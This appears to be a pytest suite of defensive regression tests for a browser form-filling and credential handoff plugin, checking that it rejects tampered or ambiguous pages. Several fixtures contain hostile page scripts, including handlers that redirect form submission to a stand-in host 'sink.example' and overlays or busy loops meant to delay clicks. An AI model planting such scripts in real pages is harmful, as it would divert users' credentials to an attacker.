"""Remaining candidate audit regressions; intercepted disposable Chromium only."""
import asyncio
import json
import time
from types import SimpleNamespace as NS

import pytest
from test_security_boundary import fixture, encrypted, submit, Ctx, Bot
from plugin.secure_handoff import SecureHandoffController

IDENTITY = (7, 7, None)

async def present(fixture, html, mode=None):
    c, s, p = await fixture(html)
    result = await c._run('present', {'mode': mode} if mode else {}, IDENTITY)
    assert result['status'] == 'waiting_for_handoff', result
    return c, s, p

@pytest.mark.asyncio
@pytest.mark.parametrize('label', ['Submit', 'Continue', 'Next'])
@pytest.mark.parametrize('fields', ['<input name="email" type="email">',
    '<input name="email" autocomplete="email"><input type="password" autocomplete="new-password">',
    '<input type="password" name="delete-confirmation">'])
async def test_ambiguous_action_is_fill_only(fixture, label, fields):
    c, s, p = await present(fixture, '<main><h1>Confirm saved-card purchase / settings</h1>'
        f'<form action="/purchase">{fields}<button>{label}</button></form>'
        '<script>document.querySelector("form").onsubmit=e=>{e.preventDefault();window.clicks=1}</script></main>')
    assert s.request['mode'] == 'form'
    await submit(c, encrypted(s.request, s.key, {'values': {f['id']: 'SYNTHETIC' for f in s.request['fields']}}))
    assert await p.evaluate('window.clicks || 0') == 0

@pytest.mark.asyncio
async def test_explicit_username_sign_in_remains_auth(fixture):
    c, s, p = await present(fixture, '<form><input autocomplete="username"><button type="button" '
        'onclick="window.clicks=1;document.body.innerHTML=\'<p>Done</p>\'">Sign in</button></form>')
    assert s.request['mode'] == 'auth'
    await submit(c, encrypted(s.request, s.key, {'values': {'f0': 'SYNTHETIC'}}))
    assert await p.evaluate('window.clicks || 0') == 1

AUTH = '<main><form id="original" action="/login"><input type="password" name="password" autocomplete="current-password"><button type="button" onclick="window.clicks=(window.clicks||0)+1">Sign in</button></form></main>'

@pytest.mark.asyncio
@pytest.mark.parametrize('mutation', [
    "document.querySelector('form').outerHTML=document.querySelector('form').outerHTML.replace('original','replacement')",
    "document.querySelector('input').name='different-purpose'",
    "document.querySelector('button').outerHTML=document.querySelector('button').outerHTML",
    "document.querySelector('button').textContent='Pay'",
])
async def test_auth_authority_is_immutable(fixture, mutation):
    c, s, p = await present(fixture, AUTH)
    raw = encrypted(s.request, s.key, {'values': {'f0': 'SYNTHETIC'}})
    await p.evaluate('() => {' + mutation + '}')
    await submit(c, raw)
    assert await p.locator('input').input_value() == ''
    assert await p.evaluate('window.clicks || 0') == 0
    assert s.status == 'rejected'

@pytest.mark.asyncio
async def test_same_form_same_semantics_field_replacement_is_allowed(fixture):
    c, s, p = await present(fixture, AUTH)
    raw = encrypted(s.request, s.key, {'values': {'f0': 'SYNTHETIC'}})
    await p.locator('input').evaluate('e => e.outerHTML=e.outerHTML')
    await submit(c, raw)
    assert await p.locator('input').input_value() == 'SYNTHETIC'
    assert await p.evaluate('window.clicks || 0') == 1

@pytest.mark.asyncio
async def test_generic_setter_never_focuses_before_commit(fixture):
    c, s, p = await present(fixture, '<form action="/safe"><input name="entry" onfocus="'
        'window.focused=true;this.form.action=\'https://sink.example/receive\';'
        'const t=Date.now();while(Date.now()-t<1200){}"></form>', 'form')
    s.request['expiresAt'] = int(time.time()*1000)+900
    c._arm_deadline(s)
    await submit(c, encrypted(s.request, s.key, {'values': {'f0': 'SYNTHETIC'}}))
    assert await p.evaluate('window.focused || false') is False
    assert await p.locator('input').input_value() == 'SYNTHETIC'
    assert s.status == 'filled'

@pytest.mark.asyncio
async def test_overlay_never_defers_auth_click_past_expiry(fixture):
    c, s, p = await present(fixture, AUTH + '<script>document.querySelector("input").oninput=()=>{'
        'const e=document.createElement("div");e.style="position:fixed;inset:0;z-index:99";'
        'document.body.append(e);setTimeout(()=>e.remove(),1800)};'
        'document.querySelector("button").onclick=()=>{window.clickedAt=Date.now();document.body.innerHTML="Done"}</script>')
    expiry = int(time.time()*1000)+1000
    s.request['expiresAt'] = expiry
    c._arm_deadline(s)
    await submit(c, encrypted(s.request, s.key, {'values': {'f0': 'SYNTHETIC'}}))
    assert await p.evaluate('window.clickedAt || 0') == 0
    assert s.status in {'rejected', 'expired'}

@pytest.mark.asyncio
async def test_last_input_invalidation_is_not_reported_filled(fixture):
    c, s, p = await present(fixture, '<form action="/safe"><input oninput="this.form.action=\'https://sink.example/receive\'"></form>', 'form')
    await submit(c, encrypted(s.request, s.key, {'values': {'f0': 'SYNTHETIC'}}))
    assert s.status == 'rejected'

@pytest.mark.asyncio
@pytest.mark.parametrize('kind', ['radio', 'checkbox'])
async def test_option_mapping_is_private_and_immutable(fixture, kind):
    html = (f'<form><label>One<input type="{kind}" name="choice" value="PRIVATE-ONE"></label>'
        + ('<label>Two<input type="radio" name="choice" value="PRIVATE-TWO"></label>' if kind == 'radio' else '') + '</form>')
    c, s, p = await present(fixture, html, 'form')
    assert 'PRIVATE-' not in json.dumps(s.request)
    raw = encrypted(s.request, s.key, {'values': {'f0': 'o0' if kind == 'radio' else 'true'}})
    await p.locator('input').first.evaluate("e => e.value='REPLACEMENT'")
    await submit(c, raw)
    assert await p.locator('input').first.is_checked() is False
    assert s.status == 'rejected'

@pytest.mark.asyncio
async def test_deadline_during_split_otp_event_blocks_next_digit(fixture):
    html = '<form>' + ''.join(f'<input autocomplete="one-time-code" inputmode="numeric" maxlength="1" aria-label="Digit {i+1} of 4">' for i in range(4)) + '</form>'
    c, s, p = await present(fixture, html)
    s.request['expiresAt'] = int(time.time()*1000)+1000
    c._arm_deadline(s)
    await p.locator('input').first.evaluate('e => e.oninput=()=>{const t=Date.now();while(Date.now()-t<1200){}}')
    await submit(c, encrypted(s.request, s.key, {'values': {'f0': '1234'}}))
    assert await p.locator('input').nth(1).input_value() == ''
    assert s.status in {'expired', 'rejected'}

@pytest.mark.asyncio
async def test_queued_present_cannot_resurrect_closed_session(fixture):
    c, s, p = await present(fixture, '<form><textarea></textarea></form>', 'form')
    await s.lock.acquire()
    closing = asyncio.create_task(c._close(IDENTITY))
    await asyncio.sleep(0)
    pending = asyncio.create_task(c._run('present', {'mode': 'form'}, IDENTITY))
    await asyncio.sleep(0)
    s.lock.release()
    await closing
    count = len(c.bot.sent)
    result = await pending
    assert result['status'] != 'waiting_for_handoff'
    assert len(c.bot.sent) == count
    assert s.key is None and s.request is None
    assert IDENTITY not in c.sessions

@pytest.mark.asyncio
@pytest.mark.parametrize('terminal', ['cancelled', 'expired'])
async def test_terminal_during_publication_never_resurrects(fixture, terminal):
    c, s, p = await fixture('<form><textarea></textarea></form>')
    entered, release = asyncio.Event(), asyncio.Event()
    async def blocked_send(*args):
        entered.set()
        await release.wait()
        return True
    c._send = blocked_send
    publishing = asyncio.create_task(c._run('present', {'mode': 'form'}, IDENTITY))
    await entered.wait()
    if terminal == 'cancelled':
        ending = asyncio.create_task(c._close(IDENTITY))
    else:
        ending = asyncio.create_task(c._deadline_expired(s, s.request['id']))
    await asyncio.sleep(0)
    release.set()
    result, _ = await asyncio.gather(publishing, ending)
    assert result['status'] != 'waiting_for_handoff'
    assert s.status == terminal
    assert s.key is None and s.request is None

@pytest.mark.asyncio
@pytest.mark.parametrize('label', ['x'*110, '界'*100])
async def test_oversize_manifest_never_sent(fixture, label):
    html = '<form><select>' + ''.join(f'<option value="o{i}">{label}{i}</option>' for i in range(64)) + '</select></form>'
    c, s, p = await fixture(html)
    result = await c._run('present', {'mode': 'form'}, IDENTITY)
    assert result['status'] != 'waiting_for_handoff'
    assert not c.bot.sent
    assert s.key is None and s.request is None

@pytest.mark.asyncio
@pytest.mark.parametrize('attrs', ['min="1"', 'max="5"', 'step="0.5"', 'step="any"'])
async def test_nondefault_range_domain_not_published(fixture, attrs):
    c, s, p = await fixture(f'<form><input type="range" {attrs}></form>')
    result = await c._run('present', {'mode': 'form'}, IDENTITY)
    assert result['status'] != 'waiting_for_handoff'
    assert not c.bot.sent

@pytest.mark.parametrize('extra', [{'demo': True}, {'url': 9}, {'timeout': True}, {'mode': []}, {'selector': '#password'}, {'allow_ambiguous_auth_action': 'true'}])
def test_actual_tool_payload_is_strictly_validated(extra):
    c = SecureHandoffController(Ctx())
    c._identity = lambda: IDENTITY
    dispatches = []
    def capture(coro):
        coro.close()
        dispatches.append(True)
        return {'status': 'dispatched'}
    c._submit = capture
    result = json.loads(c.tool({'action': 'open', **extra}))
    assert result['status'] == 'invalid'
    assert not dispatches

@pytest.mark.asyncio
async def test_demo_on_unowned_browser_rejected_before_acquisition():
    c = SecureHandoffController(Ctx(), owns_browser=False)
    acquired = []
    async def acquire():
        acquired.append(True)
        raise RuntimeError('fixture should not acquire browser')
    c._shared_context = acquire
    with pytest.raises(ValueError):
        await c._new_session(IDENTITY, 'https://fixture.example/demo', demo=True)
    assert not acquired

@pytest.mark.asyncio
async def test_commit_queued_behind_busy_browser_cannot_set_after_expiry(fixture):
    c, s, p = await present(fixture, '<form><input></form>', 'form')
    s.request['expiresAt'] = int(time.time()*1000)+650
    # The actual browser command is queued behind a busy renderer after Python admission.
    busy = asyncio.create_task(p.evaluate('() => {const t=Date.now();while(Date.now()-t<1000){}}'))
    await asyncio.sleep(.1)
    with pytest.raises(Exception):
        await c._guarded_commit(s, 0, 'SYNTHETIC')
    await busy
    assert await p.locator('input').input_value() == ''

@pytest.mark.asyncio
@pytest.mark.parametrize('action', ['open', 'attach'])
async def test_close_during_acquisition_invalidates_pending_open_or_attach(fixture, action):
    c, s, p = await fixture('<form><input></form>')
    entered, release = asyncio.Event(), asyncio.Event()
    context = s.context
    async def blocked():
        entered.set()
        await release.wait()
        return context
    c._shared_context = blocked
    args = {'url': p.url} if action == 'open' else {'origin': 'https://merchant.example'}
    pending = asyncio.create_task(c._run(action, args, IDENTITY))
    await entered.wait()
    await c._close(IDENTITY)
    release.set()
    result = await pending
    assert IDENTITY not in c.sessions
    assert result['status'] != 'waiting_for_handoff'
    assert not c.bot.sent
